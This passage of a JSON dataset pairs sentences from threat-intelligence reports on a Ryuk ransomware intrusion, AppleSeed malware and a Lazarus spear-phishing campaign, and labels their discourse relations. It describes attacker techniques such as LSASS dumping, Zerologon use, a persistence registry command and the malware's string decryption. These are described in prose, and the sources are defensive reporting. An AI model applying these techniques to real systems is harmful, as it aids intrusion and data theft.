        "S2": "Mandiant observed this attacker dump the LSASS process using Task Manager to a file named lsass.DMP, and later, zip the dump into two files named lsass.zip and lsass2.zip located in the C:\\ProgramData\\psh\\ directory.",
        "relation": "MISC"
    },
    {
        "S1": "Mandiant observed this attacker dump the LSASS process using Task Manager to a file named lsass.DMP, and later, zip the dump into two files named lsass.zip and lsass2.zip located in the C:\\ProgramData\\psh\\ directory.",
        "S2": "From this point, the attacker was observed moving laterally to different systems in the environment using Remote Desktop Protocol (RDP) connections.",
        "relation": "NEXT"
    },
    {
        "S1": "In our previous Ryuk case, we saw the threat actors leverage access to an environment via the Bazar Loader malware.",
        "S2": "This time around, we saw them accomplish their objective faster, but the general tactics and techniques stayed similar between incidents.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This time around, we saw them accomplish their objective faster, but the general tactics and techniques stayed similar between incidents.",
        "S2": "Bazar was introduced to the environment again with the delivery via phishing emails.",
        "relation": "MISC"
    },
    {
        "S1": "Bazar was introduced to the environment again with the delivery via phishing emails.",
        "S2": "For an in depth breakdown on this loader, see this analysis by Roman Marshanski & Vitali Kremez.",
        "relation": "ELABORATION"
    },
    {
        "S1": "For an in depth breakdown on this loader, see this analysis by Roman Marshanski & Vitali Kremez.",
        "S2": "Bazar, once running, was seen again injecting into explorer.exe, svchost.exe, and spawning command shell processes.",
        "relation": "MISC"
    },
    {
        "S1": "Bazar, once running, was seen again injecting into explorer.exe, svchost.exe, and spawning command shell processes.",
        "S2": "From this loader we saw initial mapping of the domain, using built-in windows utilities such as Nltest.",
        "relation": "NEXT"
    },
    {
        "S1": "From this loader we saw initial mapping of the domain, using built-in windows utilities such as Nltest.",
        "S2": "However, unlike the last case, the threat actors started at a lower privileged user and rather than proceed slowly or cautiously, they exploited the recently disclosed Zerologon vulnerability (CVE-2020-1472) to reset the machine password of the primary domain controller.",
        "relation": "NEXT"
    },
    {
        "S1": "However, unlike the last case, the threat actors started at a lower privileged user and rather than proceed slowly or cautiously, they exploited the recently disclosed Zerologon vulnerability (CVE-2020-1472) to reset the machine password of the primary domain controller.",
        "S2": "Lateral movement was initiated via SMB file transfers and WMI executions of Cobalt Strike Beacons.",
        "relation": "NEXT"
    },
    {
        "S1": "Lateral movement was initiated via SMB file transfers and WMI executions of Cobalt Strike Beacons.",
        "S2": "The network indicators align similarly to the prior campaign and were noted by Kyle Ehmke in response to our last post pivoting off the prior report\u2019s intel.",
        "relation": "MISC"
    },
    {
        "S1": "The network indicators align similarly to the prior campaign and were noted by Kyle Ehmke in response to our last post pivoting off the prior report\u2019s intel.",
        "S2": "From memory analysis, we were also able to conclude the actors were using a trial version of Cobalt Strike with the EICAR string present in the network configuration for the beacon.",
        "relation": "ELABORATION"
    },
    {
        "S1": "From memory analysis, we were also able to conclude the actors were using a trial version of Cobalt Strike with the EICAR string present in the network configuration for the beacon.",
        "S2": "Both portable executable and DLL beacons were used.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Both portable executable and DLL beacons were used.",
        "S2": "After moving laterally to the secondary domain controller, the threat actor started on more domain discovery via Net and the PowerShell Active Directory module.",
        "relation": "MISC"
    },
    {
        "S1": "After moving laterally to the secondary domain controller, the threat actor started on more domain discovery via Net and the PowerShell Active Directory module.",
        "S2": "From there, the threat actors appeared to use the default named pipe privilege escalation module on the server.",
        "relation": "NEXT"
    },
    {
        "S1": "From there, the threat actors appeared to use the default named pipe privilege escalation module on the server.",
        "S2": "At this point, the threat actors used RDP to connect from the secondary domain controller, to the first domain controller, using the built in Administrator account.",
        "relation": "NEXT"
    },
    {
        "S1": "At this point, the threat actors used RDP to connect from the secondary domain controller, to the first domain controller, using the built in Administrator account.",
        "S2": "Once on the main domain controller, another Cobalt Strike beacon was dropped and executed.",
        "relation": "NEXT"
    },
    {
        "S1": "Once on the main domain controller, another Cobalt Strike beacon was dropped and executed.",
        "S2": "Then more domain reconnaissance was performed using AdFind.",
        "relation": "NEXT"
    },
    {
        "S1": "Then more domain reconnaissance was performed using AdFind.",
        "S2": "Once this completed, at the four hour mark, the threat actors were ready for their final objective.",
        "relation": "NEXT"
    },
    {
        "S1": "Once this completed, at the four hour mark, the threat actors were ready for their final objective.",
        "S2": "Four hours and 10 minutes in, the threat actors used the pivot from the primary domain controller to RDP into the Backup server.",
        "relation": "NEXT"
    },
    {
        "S1": "Four hours and 10 minutes in, the threat actors used the pivot from the primary domain controller to RDP into the Backup server.",
        "S2": "Backup servers were again targeted first for deployment of the ransomware executable, followed by servers and then workstations.",
        "relation": "NEXT"
    },
    {
        "S1": "Backup servers were again targeted first for deployment of the ransomware executable, followed by servers and then workstations.",
        "S2": "The threat actors finished their objective by executing the ransomware on the primary domain controller, and at the 5 hour mark, the attack completed.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors finished their objective by executing the ransomware on the primary domain controller, and at the 5 hour mark, the attack completed.",
        "S2": "While last time we commented on the lead time between the first and second day to aid detection and response activity, this case goes to show that you can\u2019t count on that kind of timescale.",
        "relation": "ELABORATION"
    },
    {
        "S1": "While last time we commented on the lead time between the first and second day to aid detection and response activity, this case goes to show that you can\u2019t count on that kind of timescale.",
        "S2": "You need to be ready to act in less than an hour, to make sure you can effectively disrupt the threat actor.",
        "relation": "ELABORATION"
    },
    {
        "S1": "You need to be ready to act in less than an hour, to make sure you can effectively disrupt the threat actor.",
        "S2": "Access was initiated by a phishing email leading to the Bazar Loader malware executable.",
        "relation": "MISC"
    },
    {
        "S1": "Access was initiated by a phishing email leading to the Bazar Loader malware executable.",
        "S2": "Bazar relies on user execution of an executable to run.",
        "relation": "NEXT"
    },
    {
        "S1": "Bazar relies on user execution of an executable to run.",
        "S2": "This user was a Domain User and did not have any other permissions.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This user was a Domain User and did not have any other permissions.",
        "S2": "CVE-2020-1472 was used to reset the credentials on one of the domain controllers in the environment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "CVE-2020-1472 was used to reset the credentials on one of the domain controllers in the environment.",
        "S2": "After resetting the password, the threat actors then targeted a different domain controller, potentially due to breaking services by use of their exploit.",
        "relation": "NEXT"
    },
    {
        "S1": "After resetting the password, the threat actors then targeted a different domain controller, potentially due to breaking services by use of their exploit.",
        "S2": "Packet showing the zeroed out password.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Packet showing the zeroed out password.",
        "S2": "On one of the domain controllers we saw use of the Cobalt Strike named pipe escalation.",
        "relation": "MISC"
    },
    {
        "S1": "On one of the domain controllers we saw use of the Cobalt Strike named pipe escalation.",
        "S2": "On the first domain controller that the treat actors connected to after their initial connection, they dropped a DLL and executed it via rundll32.",
        "relation": "ELABORATION"
    },
    {
        "S1": "On the first domain controller that the treat actors connected to after their initial connection, they dropped a DLL and executed it via rundll32.",
        "S2": "Dropped via RDP and executed via rundll32 on the second domain controller.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Dropped via RDP and executed via rundll32 on the second domain controller.",
        "S2": "Shortly after, the DLL was called again via regsrv32.",
        "relation": "NEXT"
    },
    {
        "S1": "Shortly after, the DLL was called again via regsrv32.",
        "S2": "Then a 2nd DLL was dropped and executed in a similar manner on the 2nd DC.",
        "relation": "NEXT"
    },
    {
        "S1": "Then a 2nd DLL was dropped and executed in a similar manner on the 2nd DC.",
        "S2": "Ran on the beachhead.",
        "relation": "NEXT"
    },
    {
        "S1": "Ran on the beachhead.",
        "S2": "Ran on a domain controller.",
        "relation": "NEXT"
    },
    {
        "S1": "Ran on a domain controller.",
        "S2": "Then they imported the PowerShell Active Directory module.",
        "relation": "NEXT"
    },
    {
        "S1": "Then they imported the PowerShell Active Directory module.",
        "S2": "They then ran the following looking for host names, operating systems and last logon dates of all AD systems.",
        "relation": "NEXT"
    },
    {
        "S1": "They then ran the following looking for host names, operating systems and last logon dates of all AD systems.",
        "S2": "After already completing the above discovery work and having already pivoted to their 2nd domain controller, the threat actors moved on to AdFind for further domain reconnaissance.",
        "relation": "NEXT"
    },
    {
        "S1": "After already completing the above discovery work and having already pivoted to their 2nd domain controller, the threat actors moved on to AdFind for further domain reconnaissance.",
        "S2": "Contents of the script ran the following with AdFind.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Contents of the script ran the following with AdFind.",
        "S2": "The threat actor then ran this command a few times.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor then ran this command a few times.",
        "S2": "The first lateral movement occurred to the domain controller not affected by the use of CVE-2020-1472.",
        "relation": "NEXT"
    },
    {
        "S1": "The first lateral movement occurred to the domain controller not affected by the use of CVE-2020-1472.",
        "S2": "An executable was transferred to it via SMB using a domain administrator account.",
        "relation": "NEXT"
    },
    {
        "S1": "An executable was transferred to it via SMB using a domain administrator account.",
        "S2": "After transferring the exe, the threat actors utilized WMI from the beachhead host to execute the file.",
        "relation": "NEXT"
    },
    {
        "S1": "After transferring the exe, the threat actors utilized WMI from the beachhead host to execute the file.",
        "S2": "The presence of the EICAR strings point to the Cobalt Strike software being used as a trial version.",
        "relation": "MISC"
    },
    {
        "S1": "The presence of the EICAR strings point to the Cobalt Strike software being used as a trial version.",
        "S2": "They accessed the GPO\u2019s for the domain but none were modified or added.",
        "relation": "MISC"
    },
    {
        "S1": "They accessed the GPO\u2019s for the domain but none were modified or added.",
        "S2": "Shortly there after we saw a Cobalt Strike DLL transferred via the RDP connection.",
        "relation": "NEXT"
    },
    {
        "S1": "Shortly there after we saw a Cobalt Strike DLL transferred via the RDP connection.",
        "S2": "RDP was used to pivot from the main domain controller and distribute the final ransomware payload enterprise wide.",
        "relation": "NEXT"
    },
    {
        "S1": "RDP was used to pivot from the main domain controller and distribute the final ransomware payload enterprise wide.",
        "S2": "After our previous report, @kyleehmke pivoted off of our prior Ryuk report and used the network data to link several of these domains which we saw in this case.",
        "relation": "ELABORATION"
    },
    {
        "S1": "After our previous report, @kyleehmke pivoted off of our prior Ryuk report and used the network data to link several of these domains which we saw in this case.",
        "S2": "Starting around 4.5 hours after the initial Bazar malware was executed, the Ryuk threat actors acted on their final objectives and initiated RDP connections from the domain controller previously exploited, to the rest of the environment.",
        "relation": "NEXT"
    },
    {
        "S1": "Starting around 4.5 hours after the initial Bazar malware was executed, the Ryuk threat actors acted on their final objectives and initiated RDP connections from the domain controller previously exploited, to the rest of the environment.",
        "S2": "This time they initiated the ransomware first on the secondary domain controller (their 1st pivot) and transferred the Ryuk executable over the RDP connection.",
        "relation": "NEXT"
    },
    {
        "S1": "The actor has distributed its dropper embedded in an archive file (\uc678\uad50\ubd80 \uac00\ud310 2021-05-07.zip) as an attachment through spearphishing emails.",
        "S2": "The target email addresses have been collected using the actor email phishing campaigns we described in the previous section.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The target email addresses have been collected using the actor email phishing campaigns we described in the previous section.",
        "S2": "The actor conducted this spearphishing attack on May 7, 2021.",
        "relation": "NEXT"
    },
    {
        "S1": "The actor conducted this spearphishing attack on May 7, 2021.",
        "S2": "The archive file contains a JavaScript file (\uc678\uad50\ubd80 \uac00\ud310 2021-05-07.pdf.jse) which pretends to be a PDF file that contains two Base64 encoded blobs.",
        "relation": "NEXT"
    },
    {
        "S1": "The archive file contains a JavaScript file (\uc678\uad50\ubd80 \uac00\ud310 2021-05-07.pdf.jse) which pretends to be a PDF file that contains two Base64 encoded blobs.",
        "S2": "The first one is the content of the decoy PDF file in Base64 format and the other one contains the AppleSeed payload also in Base64 format (encoded twice).",
        "relation": "ELABORATION"
    },
    {
        "S1": "The first one is the content of the decoy PDF file in Base64 format and the other one contains the AppleSeed payload also in Base64 format (encoded twice).",
        "S2": "At first it uses the MSXML Base64 decoding functionality to decode the first layer and then uses certutil.exe to decode the second layer and get the final ApppleSeed payload.",
        "relation": "ELABORATION"
    },
    {
        "S1": "At first it uses the MSXML Base64 decoding functionality to decode the first layer and then uses certutil.exe to decode the second layer and get the final ApppleSeed payload.",
        "S2": "The decoy PDF file has been decoded using the MSXML Base64 decoding function.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The decoy PDF file has been decoded using the MSXML Base64 decoding function.",
        "S2": "After decoding the PDF and AppleSeed payload, the content gets written into the ProgramData directory.",
        "relation": "NEXT"
    },
    {
        "S1": "After decoding the PDF and AppleSeed payload, the content gets written into the ProgramData directory.",
        "S2": "At the end, the decoy PDF file is opened by calling Wscript.Shell.Run and the AppleSeed payload executed through PowerShell by calling regsvr32.exe.",
        "relation": "NEXT"
    },
    {
        "S1": "At the end, the decoy PDF file is opened by calling Wscript.Shell.Run and the AppleSeed payload executed through PowerShell by calling regsvr32.exe.",
        "S2": "Calling regsvr32.exe to run a DLL registers it as a server that automatically calls the DLL export function that has been named DllRegisterServer.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Calling regsvr32.exe to run a DLL registers it as a server that automatically calls the DLL export function that has been named DllRegisterServer.",
        "S2": "The dropped payload is a DLL file that has been packed using the UPX packer.",
        "relation": "MISC"
    },
    {
        "S1": "The dropped payload is a DLL file that has been packed using the UPX packer.",
        "S2": "The unpacked sample is highly obfuscated and important API calls and strings have been encrypted using a custom encryption algorithm.",
        "relation": "NEXT"
    },
    {
        "S1": "The unpacked sample is highly obfuscated and important API calls and strings have been encrypted using a custom encryption algorithm.",
        "S2": "The encrypted version of the strings and API calls are in hex ASCII format.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The encrypted version of the strings and API calls are in hex ASCII format.",
        "S2": "Whenever in the code the malware needs to use a string, it takes the encrypted string and passes it into two functions to decrypt it.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Whenever in the code the malware needs to use a string, it takes the encrypted string and passes it into two functions to decrypt it.",
        "S2": "The first function \"string_decryptor_prep\" gets the encrypted string and then prepares a custom data structure that has four elements:",
        "relation": "NEXT"
    },
    {
        "S1": "The first function \"string_decryptor_prep\" gets the encrypted string and then prepares a custom data structure that has four elements:",
        "S2": "The second function \"string_decryptor\" gets the created data structure in the previous function and then decrypts the string and puts it in the same data structure.",
        "relation": "LIST"
    },
    {
        "S1": "The second function \"string_decryptor\" gets the created data structure in the previous function and then decrypts the string and puts it in the same data structure.",
        "S2": "The decryptor function first convert the input string in hex ascii format to binary by calling the hexascii_to_binary function on each two ascii characters (i.e. c3, 42, b1, 1d... in example 1).",
        "relation": "ELABORATION"
    },
    {
        "S1": "The decryptor function first convert the input string in hex ascii format to binary by calling the hexascii_to_binary function on each two ascii characters (i.e. c3, 42, b1, 1d... in example 1).",
        "S2": "The first 16 bytes of in the input is then used as the key and the remainder is the actual value that gets decrypted in 16 byte chunks (i.e. ed, d5, 0d, 60).",
        "relation": "NEXT"
    },
    {
        "S1": "The first 16 bytes of in the input is then used as the key and the remainder is the actual value that gets decrypted in 16 byte chunks (i.e. ed, d5, 0d, 60).",
        "S2": "Decryption is a simple xor operation of key[i] ^ string[i-1] ^ string[i] (For the first character string_to_be_decrypted[i-1] is set to zero).",
        "relation": "ELABORATION"
    },
    {
        "S1": "Decryption is a simple xor operation of key[i] ^ string[i-1] ^ string[i] (For the first character string_to_be_decrypted[i-1] is set to zero).",
        "S2": "Most of the important API calls resolve dynamically during the run time using \"string_decryptor\" function.",
        "relation": "MISC"
    },
    {
        "S1": "Most of the important API calls resolve dynamically during the run time using \"string_decryptor\" function.",
        "S2": "(288 API calls have been resolved dynamically.)",
        "relation": "ELABORATION"
    },
    {
        "S1": "(288 API calls have been resolved dynamically.)",
        "S2": "The AppleSeed payload has an export function named \"DllRegisterServer\" which will be called when the DLL is executed using RegSvr32.exe.",
        "relation": "MISC"
    },
    {
        "S1": "The AppleSeed payload has an export function named \"DllRegisterServer\" which will be called when the DLL is executed using RegSvr32.exe.",
        "S2": "DllRegisterServer has a function that is responsible for performing the DLL initialization and setup that includes the following steps:",
        "relation": "ELABORATION"
    },
    {
        "S1": "DllRegisterServer has a function that is responsible for performing the DLL initialization and setup that includes the following steps:",
        "S2": "Copy itself into \"C:\\ProgramData\\Software\\ESTsoft\\Common\" and rename itself as ESTCommon.dll to pretend it is a DLL that belongs to ESTsecurity company.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Copy itself into \"C:\\ProgramData\\Software\\ESTsoft\\Common\" and rename itself as ESTCommon.dll to pretend it is a DLL that belongs to ESTsecurity company.",
        "S2": "and rename itself as to pretend it is a DLL that belongs to ESTsecurity company.",
        "relation": "NEXT"
    },
    {
        "S1": "and rename itself as to pretend it is a DLL that belongs to ESTsecurity company.",
        "S2": "Make itself persistent by creating the following registry key:",
        "relation": "NEXT"
    },
    {
        "S1": "Make itself persistent by creating the following registry key:",
        "S2": "Registry key name: EstsoftAutoUpdate Registry key value: Regsvr32.exe /s C:\\ProgramData\\Software\\ESTsoft\\Common\\ESTCommon.dll Registry location: HKLU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        "relation": "ELABORATION"
    },
    {
        "S1": "Registry key name: EstsoftAutoUpdate Registry key value: Regsvr32.exe /s C:\\ProgramData\\Software\\ESTsoft\\Common\\ESTCommon.dll Registry location: HKLU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        "S2": "Functionality activation by creating the following files into \"C:\\ProgramData\\Software\\ESTsoft\\Common\\flags\" directory and writes \"flag\" into them: FolderMonitor, KeyboardMonitor, ScreenMonitor, UsbMonitor.",
        "relation": "MISC"
    },
    {
        "S1": "Functionality activation by creating the following files into \"C:\\ProgramData\\Software\\ESTsoft\\Common\\flags\" directory and writes \"flag\" into them: FolderMonitor, KeyboardMonitor, ScreenMonitor, UsbMonitor.",
        "S2": "In the next step it creates a Mutex to make sure it only infects a victim once.",
        "relation": "NEXT"
    },
    {
        "S1": "In the next step it creates a Mutex to make sure it only infects a victim once.",
        "S2": "After creating that mutex, it checks if the current process has the right access privilege by calling GetTokenInformation API call and if it does not have the right privilege, it tries to escalate its privilege using AdjustTokenPrivilege by passing SeDebugPrivilege to it to gain system level privilege.",
        "relation": "NEXT"
    },
    {
        "S1": "After creating that mutex, it checks if the current process has the right access privilege by calling GetTokenInformation API call and if it does not have the right privilege, it tries to escalate its privilege using AdjustTokenPrivilege by passing SeDebugPrivilege to it to gain system level privilege.",
        "S2": "At the end it performs its main functionalities in separate threads.",
        "relation": "NEXT"
    },
    {
        "S1": "At the end it performs its main functionalities in separate threads.",
        "S2": "All the the collected data in each thread is being zipped and encrypted and is being sent to the command and control server using HTTP POST requests in a separate thread.",
        "relation": "NEXT"
    },
    {
        "S1": "All the the collected data in each thread is being zipped and encrypted and is being sent to the command and control server using HTTP POST requests in a separate thread.",
        "S2": "After sending the data to the server, the data is deleted from the victim's machine.",
        "relation": "NEXT"
    },
    {
        "S1": "After sending the data to the server, the data is deleted from the victim's machine.",
        "S2": "The ApppleSeed payload is using RC4 for encryption and decryption of the data.",
        "relation": "MISC"
    },
    {
        "S1": "The ApppleSeed payload is using RC4 for encryption and decryption of the data.",
        "S2": "To generate RC4 key, it creates a Random buffer of 117 bytes by Calling CryptGenRandom and then uses CryptCreateHash and CryptHashData to adds the buffer into a MD5 hash object.",
        "relation": "ELABORATION"
    },
    {
        "S1": "To generate RC4 key, it creates a Random buffer of 117 bytes by Calling CryptGenRandom and then uses CryptCreateHash and CryptHashData to adds the buffer into a MD5 hash object.",
        "S2": "Then it calls CryptDeriveKey to generate the RC4 key.",
        "relation": "NEXT"
    },
    {
        "S1": "Then it calls CryptDeriveKey to generate the RC4 key.",
        "S2": "The created 117 bytes buffer is encrypted using RSA algorithm and is sent to the sever along with RC4 encrypted data.",
        "relation": "NEXT"
    },
    {
        "S1": "The created 117 bytes buffer is encrypted using RSA algorithm and is sent to the sever along with RC4 encrypted data.",
        "S2": "The RSA key is in hex ASCII format and has been decrypted using \"string_decryptor\" function.",
        "relation": "NEXT"
    },
    {
        "S1": "The RSA key is in hex ASCII format and has been decrypted using \"string_decryptor\" function.",
        "S2": "The keylogger function uses GetKeyState and GetKeyboardState to capture the pressed keys on the victim's machine and logs all keys per process into the log.txt file.",
        "relation": "NEXT"
    },
    {
        "S1": "The keylogger function uses GetKeyState and GetKeyboardState to capture the pressed keys on the victim's machine and logs all keys per process into the log.txt file.",
        "S2": "This module takes screenshots by calling the following sequence of API calls and writes them to files: GetDesktopWindow, GetDC, CreateCompstibleDC, CreateCompatibleBitmap, Bitblt and GetDIBits and then writes them into a file using CreateFileW and WriteFile.",
        "relation": "NEXT"
    },
    {
        "S1": "This module takes screenshots by calling the following sequence of API calls and writes them to files: GetDesktopWindow, GetDC, CreateCompstibleDC, CreateCompatibleBitmap, Bitblt and GetDIBits and then writes them into a file using CreateFileW and WriteFile.",
        "S2": "This module finds the removable media devices connected to the machine and collects its data before sending it to the command and control server.",
        "relation": "NEXT"
    },
    {
        "S1": "This module finds the removable media devices connected to the machine and collects its data before sending it to the command and control server.",
        "S2": "To identify a USB drive it calls CM_Get_Device_IDW to retrieve the device instance ID that would be in format \" <device-ID>\\<instance-specific-ID> \" and then checks if it contains USB string value.",
        "relation": "ELABORATION"
    },
    {
        "S1": "To identify a USB drive it calls CM_Get_Device_IDW to retrieve the device instance ID that would be in format \" <device-ID>\\<instance-specific-ID> \" and then checks if it contains USB string value.",
        "S2": "This thread looks for txt, ppt, hwp, pdf, and doc files in the Desktop, Documents, Downloads and AppData\\Local\\Microsoft\\Windows\\INetCache\\IE directories and archives them to be ready to be exfiltrated to the server.",
        "relation": "NEXT"
    },
    {
        "S1": "In this attack, spear phishing was used as the initial infection vector.",
        "S2": "Before launching the attack, the group studied publicly available information about the targeted organization and identified email addresses belonging to various departments of the company.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Before launching the attack, the group studied publicly available information about the targeted organization and identified email addresses belonging to various departments of the company.",
        "S2": "Email addresses in those departments received phishing emails that either had a malicious Word document attached or a link to one hosted on a remote server.",
        "relation": "NEXT"
    },
    {
        "S1": "Email addresses in those departments received phishing emails that either had a malicious Word document attached or a link to one hosted on a remote server.",
        "S2": "The phishing emails claimed to have urgent updates on today\u2019s hottest topic \u2013 COVID-19 infections.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The phishing emails claimed to have urgent updates on today\u2019s hottest topic \u2013 COVID-19 infections.",
        "S2": "The phishing emails were carefully crafted and written on behalf of a medical center that is part of the organization under attack.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The phishing emails were carefully crafted and written on behalf of a medical center that is part of the organization under attack.",
        "S2": "The attackers registered accounts with a public email service, making sure the sender\u2019s email addresses looked similar to the medical center\u2019s real email address.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The attackers registered accounts with a public email service, making sure the sender\u2019s email addresses looked similar to the medical center\u2019s real email address.",
        "S2": "The signature shown in the phishing emails included the actual personal data of the deputy head doctor of the attacked organization\u2019s medical center.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The signature shown in the phishing emails included the actual personal data of the deputy head doctor of the attacked organization\u2019s medical center.",
        "S2": "The attackers were able to find this information on the medical center\u2019s public website.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The attackers were able to find this information on the medical center\u2019s public website.",
        "S2": "A macro in the Microsoft Word document contained the malicious code designed to download and execute additional malicious software on the infected system.",
        "relation": "MISC"
    },
    {
        "S1": "A macro in the Microsoft Word document contained the malicious code designed to download and execute additional malicious software on the infected system.",
        "S2": "The document contains information on the population health assessment program and is not directly related to the subject of the phishing email (COVID-19), suggesting the attackers may not completely understand the meaning of the contents they used.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The document contains information on the population health assessment program and is not directly related to the subject of the phishing email (COVID-19), suggesting the attackers may not completely understand the meaning of the contents they used.",
        "S2": "The content of the lure document was copied from an online post by a health clinic.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The content of the lure document was copied from an online post by a health clinic.",
        "S2": "Our investigation showed that the initial spear-phishing attempt was unsuccessful due to macros being disabled in the Microsoft Office installation of the targeted systems.",
        "relation": "NEXT"
    },
    {
        "S1": "Our investigation showed that the initial spear-phishing attempt was unsuccessful due to macros being disabled in the Microsoft Office installation of the targeted systems.",
        "S2": "In order to persuade the target to allow the malicious macro, the attacker sent another email showing how to enable macros in Microsoft Office.",
        "relation": "NEXT"
    },
    {
        "S1": "In order to persuade the target to allow the malicious macro, the attacker sent another email showing how to enable macros in Microsoft Office.",
        "S2": "After sending the above email with explanations, the attackers realized that the target was using a different version of Microsoft Office and therefore required a different procedure for enabling macros.",
        "relation": "NEXT"
    },
    {
        "S1": "After sending the above email with explanations, the attackers realized that the target was using a different version of Microsoft Office and therefore required a different procedure for enabling macros.",
        "S2": "The attackers subsequently sent another email showing the correct procedure in a screenshot with a Russian language pack.",
        "relation": "NEXT"
    },
    {
        "S1": "The attackers subsequently sent another email showing the correct procedure in a screenshot with a Russian language pack.",
        "S2": "The content in the spear-phishing emails sent by the attackers from May 21 to May 26, 2020, did not contain any grammatical mistakes.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The content in the spear-phishing emails sent by the attackers from May 21 to May 26, 2020, did not contain any grammatical mistakes.",
        "S2": "However, in subsequent emails the attackers made numerous errors, suggesting they may not be native Russian speakers and were using translation tools.",
        "relation": "NEXT"
    },
    {
        "S1": "However, in subsequent emails the attackers made numerous errors, suggesting they may not be native Russian speakers and were using translation tools.",
        "S2": "On June 3, 2020, one of the malicious attachments was opened by employees and at 9:30 am local time the attackers gained remote control of the infected system.",
        "relation": "NEXT"
    },
    {
        "S1": "On June 3, 2020, one of the malicious attachments was opened by employees and at 9:30 am local time the attackers gained remote control of the infected system.",
        "S2": "This group also utilized different types of spear-phishing attack.",
        "relation": "MISC"
    },
    {
        "S1": "This group also utilized different types of spear-phishing attack.",
        "S2": "One of the compromised hosts received several spear-phishing documents on May 19, 2020.",
        "relation": "MISC"
    },
    {
        "S1": "One of the compromised hosts received several spear-phishing documents on May 19, 2020.",
        "S2": "The malicious file that was delivered, named Boeing_AERO_GS.docx, fetches a template from a remote server.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malicious file that was delivered, named Boeing_AERO_GS.docx, fetches a template from a remote server.",
        "S2": "However, no payload created by this malicious document could be discovered.",
        "relation": "ELABORATION"
    },
    {
        "S1": "However, no payload created by this malicious document could be discovered.",
        "S2": "We speculate that the infection from this malicious document failed for a reason unknown to us.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We speculate that the infection from this malicious document failed for a reason unknown to us.",
        "S2": "A few days later, the same host opened a different malicious document.",
        "relation": "NEXT"
    },
    {
        "S1": "A few days later, the same host opened a different malicious document.",
        "S2": "The threat actor wiped these files from disk after the initial infection meaning they could not be obtained.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor wiped these files from disk after the initial infection meaning they could not be obtained.",
        "S2": "Nonetheless, a related malicious document with this malware was retrieved based on our telemetry.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Nonetheless, a related malicious document with this malware was retrieved based on our telemetry.",
        "S2": "It creates a payload and shortcut file and then continues executing the payload by using the following command line parameters.",
        "relation": "NEXT"
    },
    {
        "S1": "It creates a payload and shortcut file and then continues executing the payload by using the following command line parameters.",
        "S2": "- Payload path: %APPDATA%\\Microsoft\\Windows\\lconcaches.db",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Payload path: %APPDATA%\\Microsoft\\Windows\\lconcaches.db",
        "S2": "- Shortcut path: %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDrives.lnk",
        "relation": "LIST"
    },
    {
        "S1": "- Shortcut path: %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDrives.lnk",
        "S2": "- Command Line; please note that the string at the end is hard-coded, but different for each sample:",
        "relation": "LIST"
    },
    {
        "S1": "- Command Line; please note that the string at the end is hard-coded, but different for each sample:",
        "S2": "- exe [dllpath],Dispatch n2UmQ9McxUds2b29",
        "relation": "LIST"
    },
    {
        "S1": "- exe [dllpath],Dispatch n2UmQ9McxUds2b29",
        "S2": "The content of the decoy document depicts the job description of a generator/power industry engineer.",
        "relation": "MISC"
    },
    {
        "S1": "The content of the decoy document depicts the job description of a generator/power industry engineer.",
        "S2": "Upon opening a malicious document and allowing the macro, the malware is dropped and proceeds to a multistage deployment procedure.",
        "relation": "NEXT"
    },
    {
        "S1": "Upon opening a malicious document and allowing the macro, the malware is dropped and proceeds to a multistage deployment procedure.",
        "S2": "The malware used in this campaign belongs to a known malware cluster we named ThreatNeedle.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware used in this campaign belongs to a known malware cluster we named ThreatNeedle.",
        "S2": "We attribute this malware family to the advanced version of Manuscrypt (a.k.a. NukeSped), a family belonging to the Lazarus group.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We attribute this malware family to the advanced version of Manuscrypt (a.k.a. NukeSped), a family belonging to the Lazarus group.",
        "S2": "We previously observed the Lazarus group utilizing this cluster when attacking cryptocurrency businesses and a mobile game company.",
        "relation": "MISC"
    },
    {
        "S1": "We previously observed the Lazarus group utilizing this cluster when attacking cryptocurrency businesses and a mobile game company.",
        "S2": "Although the malware involved and the entire infection process is known and has not changed dramatically compared to previous findings, the Lazarus group continued using ThreatNeedle malware aggressively in this campaign.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Although the malware involved and the entire infection process is known and has not changed dramatically compared to previous findings, the Lazarus group continued using ThreatNeedle malware aggressively in this campaign.",
        "S2": "The payload created by the initial spear-phishing document loads the next stage as a backdoor running in-memory \u2013 the ThreatNeedle backdoor.",
        "relation": "MISC"
    },
    {
        "S1": "The payload created by the initial spear-phishing document loads the next stage as a backdoor running in-memory \u2013 the ThreatNeedle backdoor.",
        "S2": "ThreatNeedle offers functionality to control infected victims.",
        "relation": "ELABORATION"
    },
    {
        "S1": "ThreatNeedle offers functionality to control infected victims.",
        "S2": "The actor uses it to carry out initial reconnaissance and deploy additional malware for lateral movement.",
        "relation": "ELABORATION"
